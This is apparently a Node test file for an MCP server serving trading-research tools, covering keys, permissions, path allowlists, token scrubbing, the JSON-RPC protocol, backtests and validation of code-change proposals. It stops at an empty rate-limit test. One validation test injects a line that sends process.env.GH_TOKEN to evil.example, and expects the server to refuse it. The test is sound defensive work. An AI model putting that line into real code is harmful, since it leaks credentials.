// node --test tests/mcp.test.mjs — the ICT MCP server (api/mcp.js, api/_ictlab.js): keys, permissions, path allowlist, scrubbing,
// the MCP protocol (Streamable HTTP, JSON-RPC), every tool against a fake GitHub / OANDA (tests/fixtures/mcp-fake.mjs), proposal
// validation, rate limits, output caps, and a ChatGPT-style session end to end. No network.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fakeFetch, drive, dukaYear } from './fixtures/mcp-fake.mjs';
const require = createRequire(import.meta.url);
const handler = require('../api/mcp.js'), L = handler.lib, lab = require('../api/_ictlab.js');
const KEY = 'abcdefghijklmnopqrstuvwx';
const realFetch = globalThis.fetch;
const reset = () => { process.env.MCP_KEYS = `fred:${KEY}`; process.env.GH_READ_TOKEN = 'ghp_fake'; delete process.env.OANDA_TOKEN; L.GRANT.users = null; L.GRANT.at = 0; L.RL.clear(); L.CACHE.clear(); lab.BARS.clear(); lab.RESULTS.clear(); };
const withNet = async (net, fn) => { globalThis.fetch = net; try { return await fn(); } finally { globalThis.fetch = realFetch; } };
const rpcCall = (name, args, level = 'write', id = 1) => L.rpc('fred', { jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } }, { level });
const out = (r) => JSON.parse(r.result.content[0].text);
const post = (body, headers = {}, query = { key: KEY }) => drive(handler, { query, headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...headers }, body });

test('keys: only MCP_KEYS entries, constant length, named', () => {
  process.env.MCP_KEYS = 'fred:abcdefghijklmnopqrstuvwx, Orlando : zyxwvutsrqponmlkjihgfedcba ,bad:short';
  assert.equal(L.whoIs('abcdefghijklmnopqrstuvwx'), 'fred');
  assert.equal(L.whoIs('zyxwvutsrqponmlkjihgfedcba'), 'orlando');
  assert.equal(L.whoIs('short'), null); assert.equal(L.whoIs('abcdefghijklmnopqrstuvwy'), null); assert.equal(L.whoIs(''), null); assert.equal(L.whoIs(undefined), null);
});
test('proposals may touch the ICT edge only', () => {
  for (const p of ['ict/tracker.mjs', '.claude/skills/ICT/SKILL.md', 'tests/ict-roll.test.mjs', 'tests/fixtures/ict/trades.json', 'research/ict/notes.md', 'research/edge/ict-exits-replay/run.mjs']) assert.ok(L.okPath(p), p);
  for (const p of ['council/trader.mjs', 'api/mcp.js', '.github/workflows/ict.yml', 'ict/../api/x.js', 'ict/sub/x.mjs', 'market-structure.html', 'ict/tracker.js', '', 42, 'tests/mcp.test.mjs', 'api/_accounts.js', 'users.json']) assert.ok(!L.okPath(p), String(p));
});
test('cTrader results carry labels, never account numbers or ids', () => {
  const s = L.scrub({ label: 'ICT', account: { id: '10152144', login: '10152144' }, base: false, open: [{ positionId: 9, symbol: 'XAUUSD', pnl: 3.2, note: 'acct 10152144 here' }] });
  assert.deepEqual(s, { label: 'ICT', open: [{ symbol: 'XAUUSD', pnl: 3.2, note: 'acct … here' }] });
});
test('stats and brief', () => {
  const rows = [{ id: 'a', market: 'nq', short: 'NQ', side: 'buy', signalAt: 1, status: 'win', R: 2, grade: { letter: 'A', total: 9 }, aset: true, feat: { session: 'NY AM' } },
    { id: 'b', market: 'nq', short: 'NQ', side: 'sell', signalAt: 2, status: 'loss', R: -1, grade: { letter: 'B', total: 6 }, feat: { session: 'London' } },
    { id: 'c', market: 'es', short: 'ES', side: 'buy', signalAt: 3, status: 'open', R: null, grade: { letter: 'B+', total: 7 }, feat: {} }];
  const st = L.stats(rows);
  assert.equal(st.n, 3); assert.equal(st.open, 1); assert.equal(st.wins, 1); assert.equal(st.losses, 1); assert.equal(st.netR, 1); assert.equal(st.winRate, 0.5); assert.equal(st.byMarket.NQ.R, 1);
  assert.deepEqual(L.filterTrades(rows, { grade: 'A' }).map((t) => t.id), ['a']);
  assert.deepEqual(L.filterTrades(rows, { status: 'closed' }).map((t) => t.id), ['b', 'a']);
  assert.deepEqual(L.filterTrades(rows, { market: 'ES' }).map((t) => t.id), ['c']);
  assert.equal(L.brief(rows[0]).aSetup, true); assert.equal(L.brief(rows[2]).status, 'open');
});

// ---- protocol ----
test('JSON-RPC: initialize negotiates, ping, notifications, errors', async () => {
  const init = await L.rpc('fred', { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'x', version: '1' } } });
  assert.equal(init.result.protocolVersion, '2025-06-18'); assert.equal(init.result.serverInfo.name, 'meridian-ict'); assert.ok(init.result.serverInfo.title); assert.deepEqual(init.result.capabilities, { tools: { listChanged: false } });
  assert.match(init.result.instructions, /ict_guide/); assert.match(init.result.instructions, /stop/); assert.match(init.result.instructions, /out of sample/);
  for (const v of ['2025-11-25', '2025-03-26', '2024-11-05']) assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: v } })).result.protocolVersion, v);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2099-01-01' } })).result.protocolVersion, L.VERSIONS[0]);
  assert.deepEqual((await L.rpc('fred', { jsonrpc: '2.0', id: 'p', method: 'ping' })).result, {});
  assert.equal(await L.rpc('fred', { jsonrpc: '2.0', method: 'notifications/initialized' }), null);
  assert.equal(await L.rpc('fred', { jsonrpc: '2.0', method: 'notifications/cancelled', params: { requestId: 1 } }), null);
  assert.equal(await L.rpc('fred', { jsonrpc: '2.0', id: 5, result: {} }), null, 'a client response gets no answer');
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 3, method: 'nope' })).error.code, -32601);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 3, method: 'server/discover' })).error.code, -32601, 'newer clients fall back to initialize');
  assert.equal((await L.rpc('fred', { id: 3, method: 'ping' })).error.code, -32600);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: { x: 1 }, method: 'ping' })).error.code, -32600);
  assert.equal((await L.rpc('fred', 42)).error.code, -32600);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 3, method: 'tools/call', params: 'x' })).error.code, -32602);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'no_such_tool' } })).error.code, -32602);
  assert.equal((await L.rpc('fred', { jsonrpc: '2.0', id: 3, method: 'tools/call', params: { name: 'ict_guide', arguments: [1] } })).error.code, -32602);
  assert.equal((await rpcCall('ict_file_read', { path: 'api/mcp.js' })).result.isError, true);
});
test('tools/list: titles, annotations, schemas; write tools only for ICT write', async () => {
  const W = (await L.rpc('fred', { jsonrpc: '2.0', id: 2, method: 'tools/list' }, { level: 'write' })).result.tools, R = (await L.rpc('fred', { jsonrpc: '2.0', id: 2, method: 'tools/list' }, { level: 'read' })).result.tools;
  const writes = ['ict_note', 'ict_desk_update', 'ict_propose_change', 'ict_proposal_comment'];   // the apply tools need the apply permission too: tests/mcp-apply.test.mjs
  for (const n of ['ict_guide', 'ict_rules', 'ict_trades', 'ict_trade', 'ict_status', 'ctrader_results', 'ict_bars', 'ict_backtest', 'ict_compare', 'ict_file_list', 'ict_file_read', 'ict_my_proposals', 'search', 'fetch', ...writes]) assert.ok(W.find((t) => t.name === n), n);
  for (const n of writes) assert.ok(!R.find((t) => t.name === n), `${n} hidden from a read-only member`);
  for (const t of W) {
    assert.ok(t.title && t.description.length > 20, t.name); assert.equal(t.inputSchema.type, 'object'); assert.equal(t.inputSchema.additionalProperties, false);
    assert.equal(typeof t.annotations.readOnlyHint, 'boolean'); assert.equal(t.annotations.destructiveHint, false); assert.equal(typeof t.annotations.openWorldHint, 'boolean');
    assert.equal(t.annotations.readOnlyHint, !writes.includes(t.name), t.name); assert.ok(!('_cls' in t) && !('_write' in t), 'internal fields stay inside');
    for (const [k, p] of Object.entries(t.inputSchema.properties)) assert.ok(p.description, `${t.name}.${k} has a description`);
    if (t.outputSchema) assert.equal(t.outputSchema.type, 'object');
  }
  const s = W.find((t) => t.name === 'search'), f = W.find((t) => t.name === 'fetch');
  assert.deepEqual(s.inputSchema.required, ['query']); assert.deepEqual(f.inputSchema.required, ['id']);
  const bt = W.find((t) => t.name === 'ict_backtest'); assert.ok(bt.outputSchema); assert.deepEqual(bt.inputSchema.properties.rule.enum, ['A', 'all']); assert.equal(bt.inputSchema.properties.params.properties.piv.default, 3);
});
test('argument validation is a tool error the model can read', async () => {
  for (const [name, a, re] of [['ict_trades', { source: 'everything' }, /source must be one of/], ['ict_trades', { limit: 999 }, /<= 200/], ['ict_trades', { colour: 'red' }, /not a known argument/],
    ['ict_trade', {}, /id is required/], ['ict_backtest', { params: { piv: 99 } }, /piv must be <= 6/], ['ict_backtest', { filters: { sessions: ['Tokyo'] } }, /must be one of/], ['ict_bars', { market: 'nq', tf: '3m' }, /tf must be one of/]]) {
    const r = await rpcCall(name, a); assert.equal(r.result.isError, true, name); assert.match(r.result.content[0].text, re);
  }
});
test('HTTP: OPTIONS, GET / DELETE 405, origins, keys, parse errors, batches, protocol header', async () => {
  reset();
  await withNet(fakeFetch(), async () => {
    const o = await drive(handler, { method: 'OPTIONS', headers: { origin: 'https://chatgpt.com' } }); assert.equal(o.code, 204); assert.match(o.headers['access-control-allow-headers'], /Mcp-Protocol-Version/);
    assert.equal((await drive(handler, { method: 'GET', query: {} })).code, 401);
    const g = await drive(handler, { method: 'GET', query: { key: KEY } }); assert.equal(g.code, 405); assert.match(g.headers.allow, /POST/);
    assert.equal((await drive(handler, { method: 'DELETE', query: { key: KEY } })).code, 405);
    assert.equal((await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { origin: 'https://evil.example' })).code, 403);
    assert.equal((await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { origin: 'https://chatgpt.com' })).code, 200);
    assert.equal((await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { origin: 'http://localhost:6274' })).code, 200, 'the MCP inspector');
    assert.equal((await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { authorization: `Bearer ${KEY}` }, {})).code, 200, 'Bearer works too');
    assert.equal((await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, {}, { key: 'wrong-wrong-wrong-wrong-' })).code, 401);
    const pe = await post('{"jsonrpc": "2.0", "id": 1, "meth'); assert.equal(pe.code, 400); assert.equal(pe.body.error.code, -32700);
    assert.equal((await post([])).code, 400); assert.equal((await post(Array.from({ length: 21 }, (_, i) => ({ jsonrpc: '2.0', id: i, method: 'ping' })))).code, 400);
    const n = await post({ jsonrpc: '2.0', method: 'notifications/initialized' }); assert.equal(n.code, 202); assert.equal(n.body, null); assert.equal(n.ended, true);
    const b = await post([{ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26' } }, { jsonrpc: '2.0', method: 'notifications/initialized' }, { jsonrpc: '2.0', id: 2, method: 'ping' }]);
    assert.equal(b.code, 200); assert.ok(Array.isArray(b.body)); assert.deepEqual(b.body.map((x) => x.id), [1, 2]); assert.equal(b.headers['mcp-protocol-version'], '2025-03-26');
    const bad = await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { 'mcp-protocol-version': '1999-01-01' }); assert.equal(bad.code, 400); assert.match(bad.body.error.message, /unsupported MCP-Protocol-Version/);
    const ok = await post({ jsonrpc: '2.0', id: 1, method: 'ping' }, { 'mcp-protocol-version': '2025-06-18' }); assert.equal(ok.code, 200); assert.equal(ok.headers['mcp-protocol-version'], '2025-06-18');
    const ini = await post({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-11-25' } }, { 'mcp-protocol-version': '2099-01-01' }); assert.equal(ini.code, 200, 'initialize negotiates in its body');
  });
});
test('handler: reads trades through a fake GitHub; Both never counts a live signal twice', async () => {
  reset();
  const files = { 'council-data:ict/trades.json': [{ id: 'nq-b-1', market: 'nq', short: 'NQ', side: 'buy', signalAt: 1793926800, status: 'open', R: null, grade: { letter: 'B+', total: 7 }, feat: { session: 'NY AM' } }],
    'council-data:ict/replay.json': { trades: [{ id: 'nq-b-1-r', market: 'nq', short: 'NQ', side: 'buy', signalAt: 1793926800, status: 'open', replay: true }, { id: 'es-s-0-r', market: 'es', short: 'ES', side: 'sell', signalAt: 1700000000, status: 'win', R: 2.3, replay: true, grade: { letter: 'A', total: 9 }, aset: true, feat: { session: 'London' } }] },
    'main:.claude/skills/ICT/SKILL.md': '# ICT\n## 9. The iFVG entry model (STP)\nsweep then inversion\n## 14. Best filter: the A-setup (6 Nov 2026)\nagainst the daily bias\n' };
  await withNet(fakeFetch({ files }), async () => {
    const r = await post({ jsonrpc: '2.0', id: 9, method: 'tools/call', params: { name: 'ict_trades', arguments: { source: 'both' } } });
    assert.equal(r.code, 200); const o = r.body.result.structuredContent;
    assert.equal(o.total, 2, 'the live signal is not counted twice'); assert.equal(o.stats.wins, 1); assert.equal(o.records[0].id, 'nq-b-1');
    // one row for the signal, naming its replay execution; each execution is read by its exact id and says its source (11 Nov)
    assert.equal(o.records[0].source, 'live'); assert.equal(o.records[0].otherExecution, 'nq-b-1-r');
    const lv = out(await rpcCall('ict_trade', { id: 'nq-b-1' })), rp = out(await rpcCall('ict_trade', { id: 'nq-b-1-r' }));
    assert.deepEqual([lv.id, lv.source, lv.otherExecution.id], ['nq-b-1', 'live', 'nq-b-1-r']); assert.deepEqual([rp.id, rp.source, rp.updatePending, rp.otherExecution.id], ['nq-b-1-r', 'replay', true, 'nq-b-1']);
    assert.ok((await rpcCall('ict_trade', { id: 'es-s-0' })).result.isError, 'an id is exact: the replay execution es-s-0-r is not returned for es-s-0');
    // ChatGPT's search / fetch shapes: one text item holding JSON
    const s = await rpcCall('search', { query: 'a-setup' }); assert.equal(s.result.content.length, 1); assert.equal(s.result.content[0].type, 'text');
    const res = out(s).results; assert.ok(res.length >= 1); for (const x of res) assert.deepEqual(Object.keys(x).sort(), ['id', 'title', 'url']);
    assert.ok(res.find((x) => x.id === 'rule:14'));
    assert.ok(out(await rpcCall('search', { query: 'es london' })).results.find((x) => x.id === 'trade:es-s-0-r'));
    assert.ok(out(await rpcCall('search', { query: 'workflow' })).results.find((x) => x.id === 'guide:desk'));
    for (const id of ['rule:14', 'trade:es-s-0-r', 'guide:desk']) { const f = out(await rpcCall('fetch', { id })); assert.deepEqual(Object.keys(f).sort(), ['id', 'metadata', 'text', 'title', 'url']); assert.equal(f.id, id); assert.ok(f.text.length > 5); }
    assert.equal((await rpcCall('fetch', { id: 'rule:99' })).result.isError, true);
  });
});
test('ict_guide: the desk, the rules and the workflow', async () => {
  const g = (await rpcCall('ict_guide', {})).result.structuredContent;
  const rules = g.rules.join(' ');
  for (const re of [/Paper only/, /Every trade has a stop/, /out of sample on 2020-now/, /owner approves every rule change/]) assert.match(rules, re);
  assert.ok(g.workflow.length >= 5); assert.match(g.workflow.join(' '), /ict_compare/); assert.match(g.params, /trail_from/);
});

// ---- permissions ----
test('ICT level: perms.ict, then the record, then the built-in; write tools need write', async () => {
  reset();
  L.GRANT.users = { orlando: { mcp: true, ict: 'read' }, carlos: { perms: { mcp: true, ict: false } }, luxus: { perms: { mcp: true, ict: 'write' } }, fred: { ict: true, mcp: true }, ana: { mcp: true, perms: { ict: true } } }; L.GRANT.at = Date.now();
  assert.equal(L.ictLevel('orlando'), 'read'); assert.equal(L.ictLevel('carlos'), 'none'); assert.equal(L.ictLevel('luxus'), 'write'); assert.equal(L.ictLevel('fred'), 'write'); assert.equal(L.ictLevel('ana'), 'write');
  L.GRANT.users = {}; assert.equal(L.ictLevel('fred'), 'write', 'built-in Fred writes'); assert.equal(L.ictLevel('orlando'), 'read'); assert.equal(L.ictLevel('carlos'), 'none'); assert.equal(L.ictLevel('someone'), 'read', 'an MCP_KEYS-only name reads');
  const r = await L.rpc('orlando', { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name: 'ict_note', arguments: { text: 'x' } } }, { level: 'read' });
  assert.equal(r.error.code, -32602); assert.match(r.error.message, /write permission/);
  // through the handler: a derived key, granted, read only → no write tools; ict none → 403
  const env = { CTRADER_LINK_KEY: 'link-secret' }; process.env.CTRADER_LINK_KEY = env.CTRADER_LINK_KEY; process.env.MCP_KEYS = '';
  L.GRANT.users = { orlando: { mcp: true, ict: 'read' }, carlos: { perms: { mcp: true, ict: false } } }; L.GRANT.at = Date.now();
  await withNet(fakeFetch(), async () => {
    const lst = await post({ jsonrpc: '2.0', id: 1, method: 'tools/list' }, {}, { key: L.derivedKey('orlando', env) }); assert.equal(lst.code, 200);
    assert.ok(!lst.body.result.tools.find((t) => t.name === 'ict_propose_change')); assert.ok(lst.body.result.tools.find((t) => t.name === 'ict_backtest'));
    const c = await post({ jsonrpc: '2.0', id: 1, method: 'tools/list' }, {}, { key: L.derivedKey('carlos', env) }); assert.equal(c.code, 403);
    const l2 = await post({ jsonrpc: '2.0', id: 1, method: 'tools/list' }, {}, { key: L.derivedKey('luxus', env) }); assert.equal(l2.code, 403, 'no mcp grant');
  });
  delete process.env.CTRADER_LINK_KEY; reset();
});

// ---- research tools ----
test('ict_bars: OANDA candles, compact rows, capped; unknown market refused', async () => {
  reset(); process.env.OANDA_TOKEN = 'oanda-fake';
  const net = fakeFetch();
  await withNet(net, async () => {
    const o = (await rpcCall('ict_bars', { market: 'nq', tf: '1h', from: '2024-03-04', to: '2024-03-08' })).result.structuredContent;
    assert.equal(o.instrument, 'NAS100_USD'); assert.equal(o.tf, '1h'); assert.deepEqual(o.cols, ['time_utc', 'open', 'high', 'low', 'close', 'volume']); assert.ok(o.count >= 100 && o.count <= 120); assert.equal(o.rows[0].length, 6);
    const big = (await rpcCall('ict_bars', { market: 'xau', tf: '5m', from: '2024-01-01', to: '2024-02-01', count: 1500 })).result.structuredContent;
    assert.equal(big.count, 1500); assert.match(big.note, /1500/);
    assert.match((await rpcCall('ict_bars', { market: 'bitcoin' })).result.content[0].text, /unknown market/);
    assert.match((await rpcCall('ict_bars', { market: 'nq', tf: '5m', from: '2020-01-01', to: '2024-01-01' })).result.content[0].text, /window too long/);
    assert.ok(net.calls.every((c) => !c.url.includes('oanda-fake')), 'the token travels in a header, never in a URL');
    assert.ok(!JSON.stringify(o).includes('oanda-fake'));
  });
  reset();
});
test('ict_backtest: the desk engine on 2020-now candles, IS / OOS, by year, overrides never leak into the live rule', async () => {
  reset(); process.env.OANDA_TOKEN = 'oanda-fake';
  const E = await lab.engine(), before = JSON.stringify(E.P), net = fakeFetch();
  await withNet(net, async () => {
    const r = await rpcCall('ict_backtest', { market: 'nq', from: '2020-01-01', to: '2021-12-31', oos_from: '2021-01-01', sample_size: 5 });
    assert.equal(r.result.isError, undefined, r.result.content[0].text); const o = r.result.structuredContent;
    const C = o.combined; assert.ok(C.all.n > 20, `trades: ${C.all.n}`); assert.equal(C.is.n + C.oos.n, C.all.n);
    assert.deepEqual(Object.keys(C.byYear).sort(), ['2020', '2021']); assert.equal(C.byYear['2020'].n + C.byYear['2021'].n, C.all.n);
    for (const k of ['n', 'winRate', 'avgR', 'netR', 'pf', 'maxDD', 't']) assert.ok(k in C.all, k);
    assert.match(C.verdict, /out-of-sample screen/); assert.equal(o.sample.length, 5); assert.ok(o.sample[0].stop && o.sample[0].entry, 'every trade has a stop');
    assert.equal(o.markets.nq.params.piv, 3); assert.match(o.markets.nq.source, /OANDA NAS100_USD/);
    const calls = net.calls.length;
    const p = (await rpcCall('ict_backtest', { market: 'nq', from: '2020-01-01', to: '2021-12-31', oos_from: '2021-01-01', params: { piv: 2, be: 0, trail_from: 0 }, filters: { sides: ['buy'] } })).result.structuredContent;
    assert.equal(net.calls.length, calls, 'candles come from the cache'); assert.equal(p.markets.nq.params.piv, 2); assert.equal(p.markets.nq.params.be, null); assert.equal(p.markets.nq.params.trail, null);
    assert.equal(p.combined.all.n > 0 && p.markets.nq.bySide.sell.n, 0, 'the side filter holds');
    assert.equal(JSON.stringify(E.P), before, 'P is back to the live values');
    assert.equal((await rpcCall('ict_backtest', { market: 'nq', from: '2020-01-01', to: '2021-12-31', oos_from: '2021-01-01', sample_size: 5 })).result.structuredContent.cached, true);
    assert.match((await rpcCall('ict_backtest', { market: 'nq', from: '2018-01-01' })).result.content[0].text, /2020-01-01 or later/);
    assert.match((await rpcCall('ict_backtest', { markets: ['nq', 'zz'] })).result.content[0].text, /unknown market zz/);
    assert.match((await rpcCall('ict_backtest', { market: 'nq', from: '2021-01-01', to: '2021-01-10' })).result.content[0].text, /longer than 30 days/);
  });
  reset();
});
test('ict_compare: the live rule vs a proposal on the same candles', async () => {
  reset(); process.env.OANDA_TOKEN = 'oanda-fake';
  await withNet(fakeFetch(), async () => {
    const o = (await rpcCall('ict_compare', { markets: ['nq', 'gc'], from: '2020-01-01', to: '2021-12-31', oos_from: '2021-01-01', filters: { skip_friday: true } })).result.structuredContent;
    assert.deepEqual(o.markets, ['nq', 'gc']); assert.ok(o.live.all.n > 0); assert.ok(o.proposed.all.n <= o.live.all.n, 'a filter only removes trades');
    assert.equal(o.delta.all.n, o.proposed.all.n - o.live.all.n); assert.ok(o.byYear.length === 2 && o.byYear[0].live); assert.ok(o.byMarket.gc); assert.match(o.verdict, /live rule/);
    assert.deepEqual(o.proposal.filters, { skip_friday: true });
  });
  reset();
});
test('backtest without OANDA: the council-data research candles, and the answer says so', async () => {
  reset();
  const files = { 'council-data:research/candles/idx/USATECHIDXUSD_2023.json.gz': dukaYear(2023) };
  await withNet(fakeFetch({ files, oanda: false }), async () => {
    const o = (await rpcCall('ict_backtest', { market: 'nq', from: '2023-03-01', to: '2023-12-31', oos_from: '2023-09-01' })).result.structuredContent;
    assert.match(o.markets.nq.source, /Dukascopy/); assert.ok(o.notes.some((n) => /OANDA is not available/.test(n))); assert.ok(o.combined.all.n > 0);
    assert.match((await rpcCall('ict_backtest', { market: 'rty', from: '2023-03-01', to: '2023-12-31' })).result.content[0].text, /no candles for rty/);
  });
  reset();
});

// ---- proposals ----
const MAINF = { 'main:ict/tracker.mjs': 'export const P = { piv: 3 };\nexport const f = () => fetch("x");\n', 'main:tests/ict-roll.test.mjs': "import test from 'node:test';\ntest('a', () => {});\n" };
function ghWrites(extra = []) {
  const made = {};
  const routes = [
    ['GET', /^\/git\/ref\/heads\/main$/, () => new Response(JSON.stringify({ object: { sha: 'head1' } }))],
    ['GET', /^\/git\/commits\/head1$/, () => new Response(JSON.stringify({ tree: { sha: 'tree0' } }))],
    ['POST', /^\/git\/blobs$/, () => new Response(JSON.stringify({ sha: 'blob1' }), { status: 201 })],
    ['POST', /^\/git\/trees$/, (m, b) => { made.tree = b; return new Response(JSON.stringify({ sha: 'tree1' }), { status: 201 }); }],
    ['POST', /^\/git\/commits$/, (m, b) => { made.commit = b; return new Response(JSON.stringify({ sha: 'c1' }), { status: 201 }); }],
    ['POST', /^\/git\/refs$/, (m, b) => { made.ref = b; return new Response('{}', { status: 201 }); }],
    ['POST', /^\/pulls$/, (m, b) => { made.pr = b; return new Response(JSON.stringify({ html_url: 'https://github.com/x/pull/7', number: 7 }), { status: 201 }); }],
    ...extra];
  return { routes, made };
}
const good = { title: 'Tighter swing', what: 'piv 3 to 2', why: 'faster swings', risk: 'more trades', evidence: 'OOS avg R +0.2 vs +0.1 (n 120) @owner please',
  files: [{ path: 'ict/tracker.mjs', content: 'export const P = { piv: 2 };\nexport const f = () => fetch("x");\n' }, { path: 'tests/ict-piv.test.mjs', content: "import test from 'node:test';\nimport assert from 'node:assert';\ntest('piv', () => assert.ok(true));\n" }] };
test('ict_propose_change: validation refuses bad patches before any write', async () => {
  reset();
  const { routes, made } = ghWrites();
  await withNet(fakeFetch({ files: MAINF, routes }), async () => {
    const err = async (a) => { const r = await rpcCall('ict_propose_change', a); assert.equal(r.result.isError, true, JSON.stringify(a).slice(0, 80)); return r.result.content[0].text; };
    assert.match(await err({ ...good, files: [{ path: 'api/mcp.js', content: 'x' }] }), /not allowed|path not allowed/);
    assert.match(await err({ ...good, files: [{ path: '.github/workflows/ict.yml', content: 'x' }] }), /not allowed/);
    assert.match(await err({ ...good, files: [good.files[0]] }), /must add or update a test/);
    assert.match(await err({ ...good, files: [good.files[0], { path: 'tests/ict-roll.test.mjs', content: MAINF['main:tests/ict-roll.test.mjs'] }] }), /identical to main/);
    assert.match(await err({ ...good, files: [{ path: 'ict/tracker.mjs', content: 'export const P = { piv: 2 ;\n' }, good.files[1]] }), /syntax error in ict\/tracker\.mjs/);
    assert.match(await err({ ...good, files: [{ path: 'ict/tracker.mjs', content: good.files[0].content + 'fetch("https://evil.example/?" + process.env.GH_TOKEN);\n' }, good.files[1]] }), /adds (network access|process\.env)/);
    assert.match(await err({ ...good, files: [{ path: 'ict/new.mjs', content: "import { execSync } from 'node:child_process';\n" }, good.files[1]] }), /adds child_process/);
    assert.match(await err({ ...good, files: [{ path: 'tests/fixtures/ict/x.json', content: '{bad' }] }), /not valid JSON/);
    assert.match(await err({ ...good, risk: '' }), /risk is required/);
    assert.match(await err({ ...good, evidence: undefined }), /evidence is required/);
    assert.equal(made.ref, undefined, 'nothing was written');
  });
});
test('ict_propose_change: a valid patch becomes a draft PR with a structured body', async () => {
  reset();
  const { routes, made } = ghWrites();
  await withNet(fakeFetch({ files: MAINF, routes }), async () => {
    const r = await rpcCall('ict_propose_change', good); assert.equal(r.result.isError, undefined, r.result.content[0].text);
    const o = r.result.structuredContent; assert.equal(o.number, 7); assert.match(o.branch, /^mcp\/fred\/[a-z0-9]+-tighter-swing$/);
    assert.equal(made.pr.draft, true); assert.equal(made.pr.base, 'main'); assert.equal(made.ref.ref, `refs/heads/${o.branch}`);
    for (const h of ['## What', '## Why', '## Evidence (2020-now, in sample vs out of sample)', '## Risk', '## Server checks', '## Owner checklist']) assert.ok(made.pr.body.includes(h), h);
    assert.match(made.pr.body, /node --check ok/); assert.match(made.pr.body, /tests\/ict-piv\.test\.mjs/); assert.ok(made.pr.body.includes('`@owner`'), 'mentions never ping');
    assert.deepEqual(made.tree.tree.map((t) => t.path), ['ict/tracker.mjs', 'tests/ict-piv.test.mjs']);
  });
  // research files only: no test needed; evidence_run puts the server's table in
  process.env.OANDA_TOKEN = 'oanda-fake';
  const w = ghWrites();
  await withNet(fakeFetch({ files: MAINF, routes: w.routes }), async () => {
    const r = await rpcCall('ict_propose_change', { title: 'Notes', why: 'record', risk: 'none', evidence_run: { markets: ['gc'], filters: { sessions: ['London', 'NY AM'] } }, files: [{ path: 'research/ict/fred-notes.md', content: '# notes\n' }] });
    assert.equal(r.result.isError, undefined, r.result.content[0].text);
    assert.match(w.made.pr.body, /Server run of `ict_compare`/); assert.match(w.made.pr.body, /\| out of sample \|/); assert.match(w.made.pr.body, /\| 2020 \|/);
  });
  reset();
});
test('ict_my_proposals and ict_proposal_comment: only your own PRs', async () => {
  reset();
  const pulls = [{ number: 9, title: 'ICT (fred): a', state: 'open', draft: true, html_url: 'u9', merged_at: null, head: { ref: 'mcp/fred/x-a', sha: 's9', repo: { full_name: 'vazxanana/macro-dashboard' } } },
    { number: 8, title: 'ICT (orlando): b', state: 'open', html_url: 'u8', head: { ref: 'mcp/orlando/y', sha: 's8', repo: { full_name: 'vazxanana/macro-dashboard' } } },
    { number: 7, title: 'other', state: 'open', html_url: 'u7', head: { ref: 'mcp/fredx/z', sha: 's7', repo: { full_name: 'vazxanana/macro-dashboard' } } },
    { number: 6, title: 'ICT (fred): old', state: 'closed', merged_at: '2026-11-08T00:00:00Z', html_url: 'u6', head: { ref: 'mcp/fred/old', sha: 's6', repo: { full_name: 'vazxanana/macro-dashboard' } } }];
  let posted = null;
  const routes = [['GET', /^\/pulls\?state=/, () => new Response(JSON.stringify(pulls))],
    ['GET', /^\/commits\/s9\/check-runs/, () => new Response(JSON.stringify({ check_runs: [{ name: 'test', status: 'completed', conclusion: 'success' }] }))],
    ['GET', /^\/commits\/s6\/check-runs/, () => new Response(JSON.stringify({ check_runs: [{ name: 'test', status: 'completed', conclusion: 'failure' }] }))],
    ['GET', /^\/issues\/9\/comments/, () => new Response(JSON.stringify([{ user: { login: 'vazxanana' }, created_at: '2026-11-09T01:00:00Z', body: 'show OOS by market please ghp_SECRETSECRET' }]))],
    ['GET', /^\/issues\/6\/comments/, () => new Response('[]')], ['GET', /^\/pulls\/\d+\/reviews/, () => new Response('[]')],
    ['GET', /^\/pulls\/(\d+)$/, (m) => new Response(JSON.stringify(pulls.find((p) => p.number === +m[1]) || {}), { status: pulls.find((p) => p.number === +m[1]) ? 200 : 404 })],
    ['POST', /^\/issues\/9\/comments$/, (m, b) => { posted = b; return new Response(JSON.stringify({ html_url: 'c1' }), { status: 201 }); }]];
  await withNet(fakeFetch({ routes }), async () => {
    const o = (await rpcCall('ict_my_proposals', {})).result.structuredContent;
    assert.deepEqual(o.proposals.map((p) => p.number), [9, 6]); assert.equal(o.proposals[0].ci, 'passed'); assert.equal(o.proposals[1].ci, 'failed'); assert.equal(o.proposals[1].state, 'merged');
    assert.equal(o.proposals[0].comments[0].owner, true); assert.ok(!JSON.stringify(o).includes('ghp_SECRET'), 'tokens scrubbed from comments');
    assert.deepEqual((await rpcCall('ict_my_proposals', { state: 'merged' })).result.structuredContent.proposals.map((p) => p.number), [6]);
    assert.match((await rpcCall('ict_proposal_comment', { number: 8, text: 'hi' })).result.content[0].text, /only on your own/);
    assert.match((await rpcCall('ict_proposal_comment', { number: 7, text: 'hi' })).result.content[0].text, /only on your own/, 'mcp/fredx is not mcp/fred');
    assert.match((await rpcCall('ict_proposal_comment', { number: 99, text: 'hi' })).result.content[0].text, /no such pull request/);
    const ok = await rpcCall('ict_proposal_comment', { number: 9, text: 'done, see @vazxanana' }); assert.equal(ok.result.structuredContent.saved, true);
    assert.equal(posted.body, '**fred** (ICT MCP): done, see `@vazxanana`');
  });
});

// ---- limits and hygiene ----
test('rate limits per key: heavy tools and writes have their own budget', async () => {
  reset();
